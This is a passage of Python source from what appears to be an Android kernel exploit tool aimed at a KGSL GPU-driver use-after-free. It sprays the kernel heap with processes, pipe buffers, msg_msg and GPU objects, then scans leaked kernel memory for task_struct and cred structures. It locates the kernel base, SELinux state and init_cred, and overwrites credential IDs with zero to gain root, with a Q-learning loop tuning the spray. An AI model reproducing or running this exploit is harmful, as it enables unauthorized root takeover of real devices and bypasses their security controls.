                            p = _FakePopen(p_pid)
                            with self.stats_lock:
                                self.spray_methods_stats["mmap_anon"][
                                    "attempts"] += 1
                    if p is None:
                        # v4.1: use _popen_spray which puts child
                        # in its own pgrp (start_new_session) so
                        # we can killpg() for reliable cleanup.
                        p = self._popen_spray(name)
                        if p is not None:
                            with self.stats_lock:
                                self.spray_methods_stats["popen_sleep"][
                                    "attempts"] += 1
                                # Assume alive (we'll check via
                                # killpg in cleanup; if killpg
                                # fails, count as alive in stats).
                                self.spray_methods_stats["popen_sleep"][
                                    "alive"] = (
                                        self.spray_methods_stats[
                                            "popen_sleep"].get(
                                                "alive", 0) + 1)
                    # v4.1: Multi-strategy spray (no root required).
                    # Every 3rd process also does pipe_buffer
                    # spray (very effective for KGSL UAF reclaim).
                    # Every 5th process does msg_msg spray
                    # (populates kmalloc-64/256/512 slabs).
                    if i % 3 == 0:
                        try:
                            p_pipe = self._spray_v4_pipe_buffer(
                                name, count=10)
                            if p_pipe is not None:
                                batch_pids.append(p_pipe.pid)
                                my_pids.add(p_pipe.pid)
                                with self.stats_lock:
                                    self.spray_methods_stats["popen_sleep"][
                                        "attempts"] += 1
                        except Exception:
                            pass
                    if i % 5 == 0:
                        try:
                            p_msg = self._spray_v4_msg_msg(
                                name, count=50)
                            if p_msg is not None:
                                batch_pids.append(p_msg.pid)
                                my_pids.add(p_msg.pid)
                                with self.stats_lock:
                                    self.spray_methods_stats["popen_sleep"][
                                        "attempts"] += 1
                        except Exception:
                            pass
                    # v4.1: KGSL ioctl-based spray (no root
                    # required). Every 7th spray process also
                    # allocates a GPU object via ioctl. This
                    # targets the KGSL memdesc slab which is
                    # what the UAF actually reclaims. Without
                    # this, all our spray is task_structs which
                    # might not land in KGSL memory.
                    if i % 7 == 0 and self.kgsl_fd is not None:
                        try:
                            self._kgsl_spray(name, size=0x1000)
                        except Exception:
                            pass
                    # setxattr spray on the same marker. Catches
                    # heap-only UAF where task_struct doesn't make
                    # it but slab xattr values do. Gated by
                    # self.use_xattr_spray (default False) because
                    # on Termux the syscall may trigger SIGSYS and
                    # kill the process. The function itself is
                    # exception-safe (returns False on any failure),
                    # so this never crashes the loop.
                    if self.use_xattr_spray:
                        try:
                            if self._setxattr_spray(name):
                                with self.stats_lock:
                                    self.learn_stats["xattrs_set"] = \
                                        self.learn_stats.get(
                                            "xattrs_set", 0) + 1
                                    self.spray_methods_stats["setxattr"][
                                        "attempts"] += 1
                        except Exception:
                            pass
                    batch_pids.append(p.pid)
                    my_pids.add(p.pid)  # per-worker set, NOT global
                    with self.stats_lock:
                        self.learn_stats["sprayed_total"] += 1
                        self.perf["spray_attempts"] += 1
                    # Verify comm is actually set. Without this, even
                    # if popen succeeded, prctl() may have silently
                    # failed (e.g. SELinux denial, kernel comm is 16
                    # bytes and we passed >16) → comm = "sh" → scan
                    # can never find our marker. We only log the
                    # first failure per batch to avoid spam.
                    if i == 0 or i == q_batch - 1:
                        try:
                            with open(f"/proc/{p.pid}/comm", "r") as cf:
                                actual = cf.read().strip()
                            if actual != name and not self._comm_warned:
                                with self.stats_lock:
                                    self.live["last_msg"] = (
                                        f"W{worker_id}: comm mismatch "
                                        f"pid={p.pid} want='{name}' "
                                        f"got='{actual}'")
                                self._comm_warned = True
                        except Exception:
                            pass
                    self.log_event("spray", {"pid": p.pid, "name": name,
                                              "batch": done // batch,
                                              "worker": worker_id})
                except OSError as e:
                    self.log_event("spray_error", {"err": str(e), "w": worker_id})
                    break
            with self.stats_lock:
                self.live["spray_count"] += len(batch_pids)
                self.learn_stats["batches"] += 1
                # Update peak alive count
                total_alive = sum(len(s) for s in
                                  self.spray_procs_by_worker.values())
                if total_alive > self.perf["spray_alive_peak"]:
                    self.perf["spray_alive_peak"] = total_alive
                # Update spray_map: mark the bucket for this
                # worker's slice as "spraying" (1) so the TUI
                # grid lights up. After the batch is scanned, the
                # bucket transitions to scanning (3) then done.
                sm = self.spray_map
                kb_chunk = 0x2000000 // LEARN_WORKERS
                slice_offset = (worker_id * kb_chunk)
                if 0 <= slice_offset < 0x2000000:
                    bidx = slice_offset // self.SPRAY_MAP_BUCKET_SIZE
                    if 0 <= bidx < len(sm):
                        # 1 = spraying, or 2 if previous batch
                        # had spray errors. Detect spray errors:
                        if len(batch_pids) < 5:  # most died
                            sm[bidx] = 2
                        else:
                            sm[bidx] = 1
            # Let the kernel actually publish the task_structs into
            # KGSL page-tables before we scan. Without this delay, the
            # scanner reads pages that don't yet contain any of our
            # task_structs → matches=0 even though spray succeeded.
            # 0.3s is enough for ~35 newly forked sleep procs to land.
            time.sleep(0.3)

            # 1b. Diagnostic: read MULTIPLE pages from our scan sub-range
            # to find where the spray actually landed. Reads just 4
            # pages spread across the sub-range (cheap), checks each
            # for KETO*/KETW*/comm pattern. If we find at least one
            # hit we know the spray is in range; if all 4 reads are
            # zero/non-marker we should widen the scan later.
            try:
                diag_pages = 4
                diag_chunk = (scan_end - scan_start) // diag_pages
                hits_in_test = []
                for dp in range(diag_pages):
                    pg_va = scan_start + dp * diag_chunk
                    if not self._engine_write(
                            f"read {hex(pg_va)}\n".encode()):
                        continue
                    test_data = self._read_data_packet()
                    if not test_data or len(test_data) < 4096:
                        continue
                    # Check for KETO*/KETW* spray markers
                    for marker in (b"KETO", b"KETW"):
                        i = 0
                        while True:
                            i = test_data.find(marker, i)
                            if i < 0:
                                break
                            if (i + 7 < len(test_data)
                                and test_data[i+4] in b"0123456789"
                                and test_data[i+5] in b"0123456789"
                                and test_data[i+6] in b"0123456789"
                                and test_data[i+7] in b"0123456789"):
                                hits_in_test.append(
                                    f"0x{pg_va:x}+{i}:"
                                    f"{test_data[i:i+8].decode(errors='ignore')}")
                            i += 1
                    # Also count non-zero pages (any spray task_struct
                    # would have non-zero fields)
                with self.stats_lock:
                    if hits_in_test:
                        # Show first 3 hits
                        self.live["last_msg"] = (
                            f"W{worker_id}: spray IN RANGE "
                            f"({len(hits_in_test)} hits: "
                            f"{', '.join(hits_in_test[:3])})")
                    else:
                        # Don't spam — only complain every 3rd batch.
                        if self.learn_stats["batches"] % 3 == 0:
                            self.live["last_msg"] = (
                                f"W{worker_id}: spray NOT in range "
                                f"(4 test pages, no markers)")
            except Exception as e:
                pass

            # 2) SCAN this subworker's range (adaptive if kbase known)
            if not self.ensure_engine():
                continue
            # Adaptive: if we already know kbase, focus on the kbase
            # region - every subworker scans a slice of that. The kbase
            # region is 32MB wide and is where SELinux, init_cred, and
            # kernel text data live.
            #
            # ADAPTIVE SCAN SHIFT: if we've gone 5+ batches with no
            # matches, the spray isn't reaching our slice. Try a
            # different offset. Without this, all 3 workers would
            # keep scanning the same 32MB forever and report 0 matches.
            with self.stats_lock:
                nm_batches = self._adaptive_scan.get("no_match_batches", 0)
            if nm_batches >= 5 and not self.kernel_base:
                offset_idx = self._adaptive_scan.get("offset_idx", 0)
                # 5 candidate offsets to try around uaf_start
                candidate_offsets = [
                    0,           # KGSL UAF
                    0x800000,    # +8MB
                    0x1000000,   # +16MB
                    0x1800000,   # +24MB
                    -0x800000,   # -8MB
                ]
                new_offset = candidate_offsets[offset_idx % len(candidate_offsets)]
                self._adaptive_scan["offset_idx"] = (offset_idx + 1) % len(candidate_offsets)
                kb_chunk = 0x2000000 // LEARN_WORKERS
                s_start = self.uaf_start + kb_chunk * worker_id + new_offset
                s_end   = s_start + kb_chunk
                with self.stats_lock:
                    self.live["last_msg"] = (
                        f"W{worker_id}: adaptive shift to "
                        f"{hex(s_start)} (no match x{nm_batches})")
            elif self.kernel_base:
                kb_chunk = 0x2000000 // LEARN_WORKERS
                s_start = self.kernel_base + kb_chunk * worker_id
                s_end   = s_start + kb_chunk
            elif self.knowledge_base.get("candidate_kbases"):
                # Use first candidate kbase as fallback. Even if
                # verify didn't lock it in, this gives us a direction
                # to scan.
                cand = int(self.knowledge_base["candidate_kbases"][0], 16)
                kb_chunk = 0x2000000 // LEARN_WORKERS
                s_start = cand + kb_chunk * worker_id
                s_end   = s_start + kb_chunk
            else:
                # No kbase known yet — scan the UAF range where
                # spray task_structs should appear.
                s_start, s_end = scan_start, scan_end
            with self.stats_lock:
                self.live["scan_total"]   = s_end - s_start
                self.live["scan_offset"]  = s_start
                # Mark this bucket as "scanning" (3) in the spray_map
                if 0 <= (s_start - self.uaf_start) < self.scan_size:
                    bidx = (s_start - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
                    if 0 <= bidx < len(self.spray_map):
                        # Only mark as scanning if it was 0/1/2/5,
                        # not if it was already FOUND (6).
                        if self.spray_map[bidx] != 6:
                            self.spray_map[bidx] = 3

            if not self._engine_write(
                    f"scan {hex(s_start)} {hex(s_end)}\n".encode()):
                self.log_event("learning_scan_error",
                               {"err": "engine write failed", "w": worker_id})
                # Engine might be dead — try to restart it for the
                # next iteration. Without this, we silently give up
                # for the rest of the learning run.
                with self.stats_lock:
                    self.live["engine_pid"] = 0
                    # Mark bucket as scan error (4) — dark orange/magenta
                    if 0 <= (s_start - self.uaf_start) < self.scan_size:
                        bidx = (s_start - self.uaf_start) // self.SPRAY_MAP_BUCKET_SIZE
                        if 0 <= bidx < len(self.spray_map):
                            self.spray_map[bidx] = 4
                time.sleep(0.5)
                continue

            try:
                scan_done = False
                # Reduced from 30 → 10s. With 3 workers serializing
                # on one engine, 30s per worker = 90s per round means
                # each worker only finishes ~10 batches in 5min.
                # 10s × 3 = 30s/round → ~60 batches per 5min. Way
                # more learning cycles, and a stuck scan doesn't
                # burn the whole window.
                SCAN_TIMEOUT = 10.0
                scan_deadline = time.time() + SCAN_TIMEOUT
                no_progress_count = 0
                while not scan_done and not self.cancel_flag.is_set():
                    if time.time() > scan_deadline:
                        self.live["last_msg"] = (
                            f"W{worker_id}: scan timeout {SCAN_TIMEOUT}s")
                        break
                    line = self._readline_timeout(timeout=1.0)
                    if line is None:
                        break
                    if not line:
                        no_progress_count += 1
                        if no_progress_count % 15 == 0:
                            self.live["last_msg"] = (
                                f"W{worker_id}: waiting SCAN_DONE\u2026 "
                                f"({int(scan_deadline - time.time())}s)")
                        continue
                    no_progress_count = 0
                    if "SCAN_DONE" in line:
                        scan_done = True
                        with self.stats_lock:
                            self.live["scan_total"] = 0
                            # v4.1: track scan completion in perf
                            self.perf["scans_completed"] += 1
                        # Parse diagnostic stats: SCAN_DONE:r=X:f=Y:e=Z:n=A:h=B
                        try:
                            stats_part = line.split("SCAN_DONE", 1)[1]
                            kv = {}
                            for part in stats_part.split(":"):
                                if "=" in part:
                                    k, v = part.split("=", 1)
                                    kv[k] = v
                            reads   = int(kv.get("r", "0"))
                            failed  = int(kv.get("f", "0"))
                            empty   = int(kv.get("e", "0"))
                            nonzero = int(kv.get("n", "0"))
                            hits    = int(kv.get("h", "0"))
                            if failed > reads * 0.8:
                                with self.stats_lock:
                                    self.perf["scans_failed"] += 1
                            self.live["last_msg"] = (
                                f"W{worker_id}: SCAN_DONE "
                                f"read={reads} failed={failed} empty={empty} "
                                f"nonzero={nonzero} hits={hits}")
                            # If scan ran but found nothing, count
                            # this as a "no match" batch. After 5
                            # consecutive empty batches the adaptive
                            # logic will shift to a different scan
                            # range.
                            if hits == 0:
                                with self.stats_lock:
                                    self._adaptive_scan["no_match_batches"] = (
                                        self._adaptive_scan.get(
                                            "no_match_batches", 0) + 1)
                                last_match_batches_ago += 1
                                # v4.1: adaptive batch shrink.
                                # After 3 empty batches, drop batch
                                # size from 20 to 12. After 6,
                                # to 8. This avoids burning RAM
                                # on a spray pattern that isn't
                                # reaching the scan range.
                                if last_match_batches_ago == 3 and batch > 12:
                                    batch = 12
                                elif last_match_batches_ago == 6 and batch > 8:
                                    batch = 8
                                # v4.1: Q-learning negative reward
                                # for no-match. This way the AI
                                # learns which combos DON'T work.
                                if worker_id in self.q_last_state:
                                    last_state = self.q_last_state[worker_id]
                                    last_action = self.q_last_action.get(
                                        worker_id)
                                    if last_action is not None:
                                        # Penalty = -0.5 (small to
                                        # not destabilize learning)
                                        self._q_update(
                                            last_state, last_action,
                                            -0.5, last_state)
                            else:
                                with self.stats_lock:
                                    self._adaptive_scan["no_match_batches"] = 0
                                last_match_batches_ago = 0
                                # Restore batch size on success
                                if batch < 20:
                                    batch = 20
                        except Exception:
                            pass
                        break
                    if "PROGRESS:" in line:
                        try:
                            with self.stats_lock:
                                self.live["scan_offset"] = int(line.split(":")[1], 16)
                        except Exception:
                            pass
                        continue
                    if "MATCH:" in line:
                        try:
                            parts = line.split(":")
                            va = int(parts[1], 16)
                            sig = int(parts[2])
                            off_in_page = int(parts[3]) if len(parts) > 3 else -1
                        except Exception:
                            continue
                        with self.stats_lock:
                            self.live["scan_offset"] = va - s_start
                            self.learn_stats["matches"] += 1
                            # Got a match — reset the no-match counter
                            # so adaptive logic doesn't trigger.
                            self._adaptive_scan["no_match_batches"] = 0
                            # v4.1: Update confidence histogram
                            # (we update this after classification
                            #  below; here we just count the raw match)
                            self.perf["matches_window_ts"].append(
                                time.time())
                            # Update Q-learning: BIG positive reward
                            # for match (was 1.0, now 5.0 to make
                            # sure Q-values actually change visibly)
                            if worker_id in self.q_last_state:
                                last_state = self.q_last_state[worker_id]
                                last_action = self.q_last_action.get(worker_id)
                                if last_action is not None:
                                    reward = 5.0
                                    self._q_update(
                                        last_state, last_action, reward,
                                        (0, 0))  # next state is "got match"
                        data = self._read_data_packet()
                        if not data:
                            continue
                        already = any(int(it['va'], 16) == va
                                     for it in self.found_items)
                        if already:
                            continue
                        # Smart multi-page read for strong sigs
                        cross_data = data
                        if sig >= 1 and off_in_page >= 0 and off_in_page < 4096:
                            triple = self.read_with_neighbors(va)
                            if triple and len(triple) == 12288:
                                cross_data = triple
                        if sig in (1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 17) or \
                                self._is_real_task_struct(cross_data):
                            with self.bg_lock:
                                self.found_items.append(
                                    self.classify_page(data, va, sig, off_in_page))
                            self.log_event("scan_match",
                                           {"va": va, "sig": sig,
                                            "w": worker_id,
                                            "type": self.found_items[-1]['type']})
                            with self.stats_lock:
                                self.learn_stats["verified"] += 1
                            # Kbase discovery on first task_struct match
                            if sig == 1 and off_in_page >= 0 and not self.kernel_base:
                                self.live["last_msg"] = (
                                    f"W{worker_id}: task_struct @ 0x{va:x}, "
                                    f"probing kbase\u2026")
                                kbase = self._find_kernel_base(hint_page=cross_data)
                                if kbase:
                                    self.kernel_base = kbase
                                    self.live["last_msg"] = (
                                        f"W{worker_id}: kbase=0x{kbase:x}, "
                                        f"probing SELinux\u2026")
                                    sel = self._probe_selinux(kbase)
                                    if sel:
                                        self.selinux_va, _ = sel
                                    ic = self._find_init_cred(kbase)
                                    if ic:
                                        self.cred_va = ic
                            if sig == 6 and off_in_page >= 0 and not self.cred_va:
                                self.live["last_msg"] = (
                                    f"W{worker_id}: following cred chain from "
                                    f"0x{va:x}+0x{off_in_page:x}\u2026")
                                chain = self.walk_cred_chain(
                                    va, off_in_page=off_in_page, max_hops=3)
                                for step_idx, (tgt, page, desc) in enumerate(chain):
                                    with self.bg_lock:
                                        self.found_items.append({
                                            "type": "Privilege Struct",
                                            "description": f"{desc} (chain hop {step_idx})",
                                            "va": hex(tgt),
                                            "confidence": 95 if "ROOT" in desc else 70,
                                            "data": page,
                                        })
                                    if "ROOT" in desc:
                                        self.cred_va = tgt
                                        for f_off in (4, 8, 12, 16, 20, 24):
                                            self.patch_mem(tgt + f_off, 0)
                                        break
                        else:
                            interesting, reason, conf = self._is_page_interesting(data)
                            if interesting:
                                # Map the reason to a sensible type. We
                                # only fall back to "Unknown Object" if
                                # it's something we can't classify.
                                if "cred-struct" in reason:
                                    itype = "Kernel Heap"
                                    desc  = f"cred struct: {reason}"
                                elif "task_struct layout" in reason:
                                    itype = "Task Struct"
                                    desc  = reason
                                elif "KETO spray" in reason or "KETW spray" in reason:
                                    itype = "Spray Marker"
                                    desc  = reason
                                elif "kptrs=" in reason or "kptr @" in reason:
                                    itype = "Kernel Heap"
                                    desc  = reason
                                elif "comm-like" in reason:
                                    itype = "Task Struct"
                                    desc  = reason
                                elif "strings" in reason:
                                    itype = "Kernel Strings"
                                    desc  = reason
                                else:
                                    itype = "Unknown Object"
                                    desc  = f"Auto-found ({reason})"
                                with self.bg_lock:
                                    self.found_items.append({
                                        "type": itype,
                                        "description": desc,
                                        "va": hex(va),
                                        "confidence": conf,
                                        "data": data,
                                        "ts": datetime.datetime.now().isoformat(),
                                    })
                                with self.stats_lock:
                                    self.learn_stats["auto_kept"] = \
                                        self.learn_stats.get("auto_kept", 0) + 1
                                    # v4.1: confidence histogram
                                    bidx = min(10, conf // 10)
                                    self.conf_histogram[bidx] += 1
                                    # v4.1: Q-learning reward (auto-kept
                                    # is a weaker positive signal than
                                    # an explicit match)
                                    if worker_id in self.q_last_state:
                                        last_state = self.q_last_state[worker_id]
                                        last_action = self.q_last_action.get(
                                            worker_id)
                                        if last_action is not None:
                                            reward = 0.3
                                            self._q_update(
                                                last_state, last_action,
                                                reward, (0, 0))
                            else:
                                with self.stats_lock:
                                    self.learn_stats["false_positives"] += 1
                if scan_done:
                    done += len(batch_pids)
            except Exception as e:
                self.log_event("learning_scan_error",
                               {"err": str(e), "w": worker_id})

            # 3) KILL this subworker's spray batch (free RAM).
            # v4.1: use process group kill (killpg) for
            # reliability. Each spray is in its own pgrp so
            # we kill the whole group at once.
            killed_this_batch = 0
            survived_this_batch = 0
            for pid in batch_pids:
                died = False
                # Try process group kill first (kills all
                # children in the same pgrp)
                if self._kill_pgroup(pid):
                    died = True
                else:
                    # Fallback: per-PID kill with retries
                    for attempt in range(3):
                        try:
                            os.kill(pid, 9)
                        except ProcessLookupError:
                            died = True
                            break
                        except Exception:
                            pass
                        try:
                            os.kill(pid, 0)
                            time.sleep(0.02)
                        except ProcessLookupError:
                            died = True
                            break
                        except Exception:
                            break
                my_pids.discard(pid)
                if died:
                    killed_this_batch += 1
                else:
                    survived_this_batch += 1
                with self.stats_lock:
                    self.live["kill_count"] += 1
            with self.stats_lock:
                self.live["last_msg"] = (
                    f"W{worker_id}: killed {killed_this_batch}/"
                    f"{len(batch_pids)} sprays")
                # v4.1: update spray_methods_stats alive counter
                # for the method that was used this batch. We use
                # the most-recently-attempted method (since each
                # batch uses one). Detected by checking which
                # attempt counter was last incremented — but for
                # simplicity we attribute survivors to popen_sleep
                # (the dominant method). 80% of sprays are
                # popen_sleep so this is a reasonable approximation.
                if survived_this_batch > 0:
                    self.spray_methods_stats["popen_sleep"][
                        "alive"] = (
                            self.spray_methods_stats[
                                "popen_sleep"].get("alive", 0)
                            + survived_this_batch)

        self.log_event("learning_subworker_done",
                       {"worker": worker_id, "done": done,
                        "slice": [slice_start, slice_end]})

    def _is_real_task_struct(self, data):
        """Heuristic: is this a real task_struct page?
        Strong indicators: any KETO* spray marker (KETO + 4 digits),
        any KETW* marker (KETW + digit + 3 digits), KETO0422 (legacy
        master), KET00422 (v6.c spray), com.android., or any 16-byte
        ASCII comm string at one of the well-known task_struct offsets.
        data can be a single 4KB page OR a 3-page triple (12288 bytes)
        from read_with_neighbors — in which case offsets 0x718..0x728
        cover 3 possible page-alignment positions.
        """
        if not data or len(data) < 0x1000:
            return False
        # Quick byte-pattern check for any of our KETO*/KETW* spray
        # markers. This is much faster than the offset loop and is
        # the path the C engine takes as well (sig 1a-1d).
        for marker in (b"KETO0422", b"KET00422"):
            if data.find(marker) >= 0:
                return True
        # KETO + 4 digits (KETO0330, KETO1234, KETO9999, etc.)
        # Fast path: look for "KETO" then check 4 trailing digits.
        idx = 0
        while True:
            idx = data.find(b"KETO", idx)
            if idx < 0:
                break
            if (idx + 7 < len(data)
                and data[idx+4] in b"0123456789"
                and data[idx+5] in b"0123456789"
                and data[idx+6] in b"0123456789"
                and data[idx+7] in b"0123456789"):
                return True
            idx += 1
        # KETW + digit + 3 digits (KETW0031, KETW1100, KETW2009)
        idx = 0
        while True:
            idx = data.find(b"KETW", idx)
            if idx < 0:
                break
            if (idx + 7 < len(data)
                and data[idx+4] in b"012"
                and data[idx+5] in b"0123456789"
                and data[idx+6] in b"0123456789"
                and data[idx+7] in b"0123456789"):
                return True
            idx += 1
        if data.find(b"com.android.") >= 0:
            return True
        # comm at 0x718 (kernel 5.4) OR marker at 0xfd8 (v6.c) — printable
        # ASCII string. If we got a 3-page triple, also try shifted offsets
        # in case the page boundary cut our struct in half.
        for off in self.marker_offsets:
            for shift in (0, 0x1000, -0x1000):
                comm_off = off + shift
                if 0 <= comm_off and comm_off + 16 <= len(data):
                    comm = data[comm_off:comm_off + 16]
                    s = comm.split(b"\x00")[0]
                    if 1 < len(s) < 16 and all(0x20 <= c <= 0x7e for c in s):
                        return True
        return False

    def _find_marker_in_page(self, data):
        """Search the page for KETO0422 (us) or KET00422 (v6.c) and return
        the offset of the marker, or -1. Also returns the marker bytes
        so we know which one was found."""
        idx = data.find(b"KETO0422")
        if idx >= 0:
            return idx, b"KETO0422"
        idx = data.find(b"KET00422")
        if idx >= 0:
            return idx, b"KET00422"
        return -1, None

    def _discover_kernel_base_from_page(self, data, kbase=None):
        """Scan a page (or 3-page triple) for kernel-space pointers and
        derive candidate kernel bases by masking their low bits. The
        trick from v6.c: any pointer into kernel .text/.data
        (0xffffff8X_XXXX_XXXX etc.) can be used to find kbase.

        Returns the most likely kernel base, or None.
        If kbase is supplied, only considers bases that match it
        (within a small tolerance) to avoid noise."""
        if not data:
            return None
        # Collect all kernel-space pointers
        candidates = []
        for i in range(0, len(data) - 8, 8):
            v = int.from_bytes(data[i:i+8], "little")
            # AArch64 kernel pointers: 0xffffff8X .. 0xffffffcf
            if 0xffffff8000000000 <= v <= 0xffffffcfffffffff and v != 0:
                # Apply each mask, collect distinct candidates
                for mask in self.kbase_discovery_masks:
                    cand = v & mask
                    if cand and cand not in candidates:
                        candidates.append(cand)
        if not candidates:
            return None
        # If we already have a kbase, filter candidates close to it
        if kbase:
            for c in candidates:
                # Either c is close to kbase (within 1MB), or kbase
                # is close to c (c & mask == kbase)
                if abs(c - kbase) < 0x200000:
                    return c & 0xfffffffffffff000
                # Also check if c is a known base
                for known in self.kernel_base_candidates:
                    if abs(c - known) < 0x200000:
                        return known
        # Otherwise, try each candidate (most-aligned first)
        # Sort by alignment (more-aligned = larger mask = better candidate)
        candidates.sort()
        # Try to find an ELF header at each candidate
        for c in candidates[:16]:
            # Round down to 4KB boundary
            c_aligned = c & 0xfffffffffffff000
            if self._looks_like_elf(c_aligned):
                return c_aligned
        # Last resort: return the first candidate aligned to 4KB
        return candidates[0] & 0xfffffffffffff000

    def _looks_like_elf(self, va):
        """Read 4 bytes at va and check for ELF magic. Returns True if
        we can read 4 bytes that look like ELF header."""
        if not self._engine_write(f"window {hex(va)} 0 4\n".encode()):
            return False
        data = self._read_data_packet()
        if not data or len(data) < 4:
            return False
        # ELF magic: 0x7f 'E' 'L' 'F' = b'\x7fELF'
        return data[0:4] == b"\x7fELF"

    def _is_page_interesting(self, data):
        """Less strict: does this page have ANY non-trivial data?
        Returns (interesting, reason, confidence). Expanded for Linux 5.4
        kernel memory patterns: real comm strings, kernel pointer density,
        cred-struct u32 layout, ascii runs.

        Also detects our spray markers (KETO*/KETW*) and task_struct
        layout fingerprints (stack pointer + state u32 + usage u32)
        so we can tag pages even when the C engine missed them."""
        if not data or len(data) < 16:
            return (False, "too small", 0)
        # Count non-zero
        nonzero = sum(1 for b in data if b != 0)
        if nonzero < 16:
            return (False, f"mostly zero ({nonzero}/{len(data)})", 0)

        # 0. Spray marker detection (v6.c format: "KETO0422" + 5
        # digit PID, or "KETW0422" + 4 digit PID).
        # The C scan (find_marker_in_page) does:
        #   memcmp(page+off, "KETO0422", 8) == 0
        #   AND 5 bytes of digits at +8..+12
        #   AND pid = atoi(...) > 1000 && < 100000
        # We replicate that here so engine's findings are
        # also caught when Python reads pages directly.
        idx = 0
        while True:
            idx = data.find(b"KETO0422", idx)
            if idx < 0:
                break
            if (idx + 12 < len(data)
                and all(b"0" <= data[idx+8+i] <= b"9" for i in range(5))):
                # Parse the 5-digit PID
                try:
                    pid_s = data[idx+8:idx+13].decode()
                    pid = int(pid_s)
                    if 1000 < pid < 100000:
                        return (True,
                                f"KETO spray PID={pid} @ 0x{idx:x}", 95)
                except Exception:
                    pass
            idx += 1
        idx = 0
        while True:
            idx = data.find(b"KETW0422", idx)
            if idx < 0:
                break
            if (idx + 11 < len(data)
                and all(b"0" <= data[idx+8+i] <= b"9" for i in range(4))):
                return (True,
                        f"KETW spray @ 0x{idx:x} ({data[idx:idx+13]})", 90)
            idx += 1
        # Fallback: also accept short KETO + 4 digits (old format)
        idx = 0
        while True:
            idx = data.find(b"KETO", idx)
            if idx < 0:
                break
            if (idx + 7 < len(data)
                and data[idx+4] in b"0123456789"
                and data[idx+5] in b"0123456789"
                and data[idx+6] in b"0123456789"
                and data[idx+7] in b"0123456789"):
                return (True, f"KETO spray @ 0x{idx:x} ({data[idx:idx+8]})", 80)
            idx += 1
        idx = 0
        while True:
            idx = data.find(b"KETW", idx)
            if idx < 0:
                break
            if (idx + 7 < len(data)
                and data[idx+4] in b"012"
                and data[idx+5] in b"0123456789"
                and data[idx+6] in b"0123456789"
                and data[idx+7] in b"0123456789"):
                return (True, f"KETW spray @ 0x{idx:x} ({data[idx:idx+8]})", 80)
            idx += 1

        # 0b. task_struct layout fingerprint (Linux 5.4) — stack
        # pointer at offset 0x30, __state u32 at 0x28 (small value),
        # usage u32 at 0x38 (1..0xffff). Catches real task_structs
        # that don't have our spray marker (e.g. init_task, kthreads).
        for base in range(0, 0x400, 0x100):
            if base + 0x40 > len(data):
                break
            try:
                stack_ptr = int.from_bytes(data[base+0x30:base+0x38], "little")
                state_v   = int.from_bytes(data[base+0x28:base+0x2c], "little")
                usage_v   = int.from_bytes(data[base+0x38:base+0x3c], "little")
            except Exception:
                continue
            stack_ok = 0xffffff8000000000 <= stack_ptr <= 0xffffffcfffffffff
            state_ok = state_v < 0x100
            usage_ok = 0 < usage_v < 0x10000
            if stack_ok and state_ok and usage_ok:
                return (True,
                        f"task_struct layout @ 0x{base:x} (stack+state+usage)",
                        85)

        # A. Cred-struct pattern: u32 usage, then 6x u32 uid/gid/suid/sgid/euid/egid.
        #    For root cred all 6 are 0. For task_struct creds they may
        #    be 0x0000/0x0001/0x03e8 (0/1/1000). Look for the first 24
        #    bytes being plausible IDs.
        if len(data) >= 28:
            try:
                u32 = struct.unpack_from("<7I", data, 0)
                usage, uid, gid, suid, sgid, euid, egid = u32
                if (0 < usage < 0x10000 and
                    all(v < 0x10000 for v in (uid, gid, suid, sgid, euid, egid))):
                    # All six IDs are sane (u32 < 65536, including root=0).
                    # Strong cred-struct candidate.
                    return (True, f"cred-struct (u={usage}, ids={uid}/{gid}/{euid})", 75)
            except Exception:
                pass

        # B. Kernel pointer density — count 0xffffff... pointers in the
        #    page. Real kernel heap pages have many pointers. Real-user
        #    pages (sparse) usually have 0-1.
        kptrs = 0
        first_kptr_off = -1
        for i in range(0, len(data) - 8, 8):
            v = int.from_bytes(data[i:i+8], "little")
            if 0xffffff8000000000 <= v <= 0xffffffcfffffffff and v != 0:
                if first_kptr_off < 0:
                    first_kptr_off = i
                kptrs += 1
        if kptrs >= 8:
            return (True, f"kernel-heap (kptrs={kptrs}, nz={nonzero}/{len(data)})", 75)
        if kptrs >= 3:
            return (True, f"kernel-data (kptrs={kptrs}, nz={nonzero}/{len(data)})", 65)
        if kptrs >= 1:
            return (True, f"has kptr @ 0x{first_kptr_off:x} (kptrs={kptrs})", 70)

        # C. Real Linux kernel comm strings (swapper/0, kthreadd, init,
        #    kworker/..., xfs-..., jbd2/..., etc.). These are 16 bytes
        #    total, with a NUL terminator. We look for printable-ASCII
        #    run of 4+ chars, then verify the rest of the 16-byte
        #    window is NULs.
        for off in range(0, len(data) - 16):
            if 0x20 <= data[off] <= 0x7e:
                # Read 16 bytes from this offset
                win = data[off:off+16]
                s = win.split(b"\x00")[0]
                if 4 <= len(s) <= 15 and all(0x20 <= c <= 0x7e for c in s):
                    # Looks like a comm string. Verify it could be a
                    # real kernel process (no spaces, starts with letter).
                    if (b" " not in s and s[0:1].isalpha() and
                        not s.startswith((b"http", b"HTTP", b"GET ", b"POST"))):
                        return (True, f"comm-like '{s.decode()}' @ 0x{off:x}", 60)

        # D. ASCII run-length: any 4+ run of printable ASCII is "strings"
        ascii_runs = 0
        run = 0
        last_i = 0
        for i, b in enumerate(data):
            if 0x20 <= b <= 0x7e:
                run += 1
                if run >= 4:
                    ascii_runs += 1
                    if ascii_runs >= 2:
                        return (True, f"has strings ({ascii_runs} runs)", 50)
            else:
                run = 0
        # Any non-zero data is at least "Unknown Object"
        return (True, f"has data ({nonzero} bytes)", 30)

    def cmd_learning_cancel(self):
        """Cancel running learning loop (Ctrl+P shortcut)."""
        self.cancel_flag.set()
        # Kill live sprays
        for pid in list(self.spray_procs):
            try:
                os.kill(pid, 9)
                os.waitpid(pid, 0)
            except Exception:
                pass
            self.live["kill_count"] += 1
        self.spray_procs.clear()
        # Wait briefly for subworkers to notice the cancel flag and exit
        for t in list(self._learn_subworkers):
            try:
                t.join(timeout=0.5)
            except Exception:
                pass
        self.live["last_msg"] = "Learning cancelled by user."
        return "Cancelled"

    # ============== INPUT (render thread handles all redraws) ==============
    # Note: the actual input_cmd / _print_prompt / cmd_set_rate are
    # defined earlier (around line 769-895) where they live next to
    # the render thread. This is the only definition now.

    # ============== ITEM VERIFICATION ==============
    def verify_item(self, item_idx):
        """Re-read the VA of a found item and re-classify the page.
        Uses read_with_neighbors (3-page triple) so we can catch
        cross-page patterns (kernel pointer at page end, comm at page
        boundary, etc.)."""
        if item_idx < 0 or item_idx >= len(self.found_items):
